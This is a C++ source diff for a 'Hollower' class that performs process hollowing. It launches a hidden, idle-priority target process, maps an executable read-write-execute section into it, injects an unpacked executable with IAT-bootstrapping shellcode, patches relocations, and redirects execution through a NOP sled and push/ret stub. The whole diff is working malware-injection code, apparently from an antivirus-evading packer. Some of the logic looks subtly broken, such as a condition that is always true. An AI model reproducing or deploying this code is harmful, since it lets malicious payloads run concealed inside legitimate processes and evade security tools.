@@ -5,16 +5,19 @@
 #include "AVStringTable.h"
 #include <Psapi.h>
 
+#define EXE_OFFSET 0x200
 #define STATUS_CONFLICTING_ADDRESSES 0xC0000018
 #define TARGET_PROCESSOR 1 //used for affinity 
 HANDLE hSection;
 
-Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
+Hollower::Hollower(std::wstring targetProcPath, BYTE* unpackedExe)
 {
 	this->hollowedProcPath = targetProcPath;
-	this->packedPEData = new PEData(unpackedExe);
+	this->packedPEData = new PEData((IMAGE_DOS_HEADER*)(unpackedExe));
 	this->hollowedPEData = new PEData(targetProcPath);
-
+	riscySupportedProcess = false;
+	if (std::find(supportedRISCYHollowers.begin(), supportedRISCYHollowers.end(), hollowedProcPath) == supportedRISCYHollowers.end())
+		riscySupportedProcess = true;
 	AV_stringTable *AS = new AV_stringTable();
 
 	HMODULE hmNtdll = GetModuleHandle(AS->Ntdll.c_str());
@@ -27,7 +30,7 @@ Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 	this->IATshellcodeSize = GetFunctionSize(IATshellcode);
 
 	this->imageOffset = (void*)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint + this->IATshellcodeSize + 0x100);
-	this->remoteNopBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;;
+	this->remoteNopBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;
 	this->remoteCodeBase = NULL;
 }
 
@@ -88,7 +91,7 @@ size_t Hollower::SerializeIATInfo()
 	return (size_t)((int)sectionPos - (int)this->localCodeSectionBase)+2;
 }
 
-void Hollower::WriteIATInfo(size_t IATInfoOffset)
+void Hollower::InjectBootstrapper(size_t IATInfoOffset)
 {
 
 	AV_stringTable *AS = new AV_stringTable();
@@ -107,13 +110,13 @@ void Hollower::WriteIATInfo(size_t IATInfoOffset)
 	int getProcAddrStr = loadlibraryStr + 0x20;
 	strcpy_s((char*)getProcAddrStr, 15, AS->GetProcAddress.c_str());
 
-	IATBootstrapEP = (int)this->localCodeSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint);
+	IATBootstrapLocalEP = (void*)((int)this->localCodeSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint));
 
 	//copy IATShellcode
-	memcpy((void*)IATBootstrapEP, IATshellcode, this->IATshellcodeSize);
+	memcpy((void*)IATBootstrapLocalEP, IATshellcode, this->IATshellcodeSize);
 
-	//Rewrite shellcode settings
-	FindReplaceMemory((void*)IATBootstrapEP,
+	//Apply shellcode settings
+	FindReplaceMemory(IATBootstrapLocalEP,
 		(size_t)this->IATshellcodeSize,
 		std::map<DWORD, DWORD>({
 								{ SECTION_BASE_PLACEHOLDER, (DWORD)this->remoteCodeBase },
@@ -126,42 +129,38 @@ void Hollower::WriteIATInfo(size_t IATInfoOffset)
 								{ RET_INT3_INT3_INT3, PUSH | PUSH_PLACEHOLDER}
 								}));
 
-	FindReplaceMemory((void*)IATBootstrapEP,
+	FindReplaceMemory(IATBootstrapLocalEP,
 		(size_t)this->IATshellcodeSize,
 		std::map<DWORD, DWORD>({
 							{ PUSH_PLACEHOLDER >> 8, (DWORD)this->remoteCodeBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() } //Push OEP before RET
 	}));
 
-	*(DWORD*)((int)IATBootstrapEP + (int)this->IATshellcodeSize + 1) = RET_INT3_INT3_INT3;
+	*(DWORD*)((int)IATBootstrapLocalEP + (int)this->IATshellcodeSize + 1) = RET_INT3_INT3_INT3;
+	
+	FixRelocations();
 }
 
 void Hollower::FixRelocations()
 {
 	IMAGE_BASE_RELOCATION* relocationDirectory = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-	int relocationSize = *(int*)((int)this->localCodeSectionBase + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+	int relocationSize = (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
 	int relPos = 0;
 	
 	while (relPos < relocationSize)
 	{
-		DWORD majorOffset = (DWORD)relocationDirectory->VirtualAddress + relPos;
+		DWORD majorOffset = ((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->VirtualAddress;
 		size_t blockSize = (DWORD)relocationDirectory->SizeOfBlock;
 		DWORD block = (DWORD)((DWORD*)relocationDirectory+2);
-		for (size_t i = relPos; i < blockSize / 4; i++)
+		for (size_t i = relPos; i <= blockSize / 4; i++)
 		{
 			BYTE minorOffset = *(BYTE*)block;
 
 			void* addrToBePatched = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + majorOffset + minorOffset);
 			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched) - (int)this->packedPEData->GetOptionalHeader()->ImageBase) + (int)this->remoteCodeBase);
-			(WORD*)block++;
+			block+=2;
 		}
 		relPos += blockSize;
 	}
-}
-
-void Hollower::InjectBootstrapCode(size_t IATInfoOffset)
-{
-	WriteIATInfo(IATInfoOffset);
-	FixRelocations();
 }
 
 HANDLE Hollower::CreateSectionBuffer(void* &base, SIZE_T size)
@@ -171,7 +170,9 @@ HANDLE Hollower::CreateSectionBuffer(void* &base, SIZE_T size)
 	sMaxSize.LowPart = size;
 	sMaxSize.HighPart = 0;
 
-	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | 
+													   SECTION_MAP_READ | 
+		                                               SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 	status = this->NtMapViewOfSection(hSection, HANDLE(0xffffffff), &base, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE);
 	return hSection;
 }
@@ -188,70 +189,90 @@ DWORD WINAPI Hollower::MemHotswap(LPVOID lpParam)
 void Hollower::SwapMemory()
 {
 	DWORD tid;
-	const size_t MAP_SIZE = 0x5000;
+	const size_t MAP_SIZE = this->hollowedPEData->GetOptionalHeader()->SizeOfImage;
 	this->hNopSection = CreateSectionBuffer(this->localNopSectionBase, MAP_SIZE);
-	memset((void*)((int)this->localNopSectionBase), NOP, MAP_SIZE);
-	
-//	int OEP = (int)this->remoteNopBase + (int)(this->packedPEData->GetOptionalHeader()->AddressOfEntryPoint);
+	memset((void*)((int)this->localNopSectionBase), NOP, MAP_SIZE); //Build NOP sled
 
-	long long int push = 0x68;
-	long long int ret = 0xc3;
-	long long int jmp2OEP = 0;
+	long long int push = 0x000000000068;
+	long long int ret = 0xc30000000000;
+	long long int ret2OEP = 0;
+	IATBootstrapRemoteEP = (void*)((int)(int)this->remoteCodeBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint));
+	long long int epAddr = (long long int)IATBootstrapRemoteEP;
+	ret2OEP = push | epAddr << 0x8 | ret; // PUSH ShellCodeEntryPoint; 
+										  // RET
 
-	jmp2OEP = push | IATBootstrapEP << 0x8 | ret << 0x28;
+	*(long long int*)((BYTE*)this->localNopSectionBase + (MAP_SIZE - 0x10)) = ret2OEP; //End NOP sled with push/ret
 
-	*(long long int*)((BYTE*)this->localNopSectionBase + (MAP_SIZE - 0x10)) = jmp2OEP;
+	HANDLE hThread = CreateThread(NULL, 0, MemHotswap, this, 0, &tid);
 
-	HANDLE hT1 = CreateThread(NULL, 0, MemHotswap, this, 0, &tid);
+	SetThreadAffinityMask(hThread, TARGET_PROCESSOR);
+	SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
 
-	SetThreadAffinityMask(hT1, TARGET_PROCESSOR);
-	SetThreadPriority(hT1, THREAD_PRIORITY_TIME_CRITICAL);
+	WaitForSingleObject(hThread, INFINITE);
+}
 
-	WaitForSingleObject(hT1, INFINITE);
+void* Hollower::GetRemoteImageBase()
+{
+	size_t size = sizeof(HMODULE); //only get first loaded module (which is image base)
+	DWORD sizeNeeded;
+	HMODULE* modules = (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+	EnumProcessModules(this->hRemoteProc, modules, size, &sizeNeeded);
+
+	return (void*)*modules;
 }
 
 HANDLE Hollower::DoHollow()
 {
 	size_t secSize = this->packedPEData->GetOptionalHeader()->SizeOfImage > this->hollowedPEData->GetOptionalHeader()->SizeOfImage
-		? this->packedPEData->GetOptionalHeader()->SizeOfImage 
-		: this->hollowedPEData->GetOptionalHeader()->SizeOfImage;
+		? this->packedPEData->GetOptionalHeader()->SizeOfImage + IATshellcodeSize + 0x500
+		: this->hollowedPEData->GetOptionalHeader()->SizeOfImage + IATshellcodeSize + 0x500;
 
-	HANDLE hSection = CreateSectionBuffer(this->localCodeSectionBase, 0x97000);
-	StartRemoteProcess();
+	HANDLE hSection = CreateSectionBuffer(this->localCodeSectionBase, secSize);
+	if(!StartRemoteProcess())
+		return NULL;
+	this->remoteNopBase = GetRemoteImageBase();
 	MapAtAddress(this->hRemoteProc, hSection, this->remoteCodeBase);
 	WriteSections();
 	size_t IATInfoOffset = SerializeIATInfo();
 	//Write IAT stub which will process serialized IAT info
-	InjectBootstrapCode(IATInfoOffset);
+	InjectBootstrapper(IATInfoOffset);
 
 	SwapMemory();
 
+	if (!riscySupportedProcess)
+		ResumeThread(this->hRemoteThread);
 	return this->hRemoteProc;
 }
 
 
-void Hollower::StartRemoteProcess()
+bool Hollower::StartRemoteProcess()
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	memset(&si, 0, sizeof(si));
-
+	bool suspendRequired = false;
 	si.cb = sizeof(STARTUPINFO);
 	wchar_t app[MAX_PATH] = {};
 	
 	std::copy(hollowedProcPath.begin(), hollowedProcPath.end(), app);
-
-	CreateProcess(app, NULL , NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 	
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = false;
+	CreateProcess(app, NULL , NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+	if (!riscySupportedProcess)
+		SuspendThread(pi.hProcess);
 	this->hRemoteProc = pi.hProcess;
 	this->hRemoteThread = pi.hThread;
-	
+
 	SetPriorityClass(this->hRemoteProc, IDLE_PRIORITY_CLASS);
 	SetThreadPriority(this->hRemoteThread, THREAD_PRIORITY_IDLE);
 	SetThreadAffinityMask(this->hRemoteThread, TARGET_PROCESSOR);
 	SetProcessPriorityBoost(this->hRemoteProc, true);
 
-	Sleep(1000);	
+	WaitForSingleObject(this->hRemoteProc, 1000);
+	if (WAIT_OBJECT_0)
+		return false;
+	return true;
 }
 
 Hollower::~Hollower()
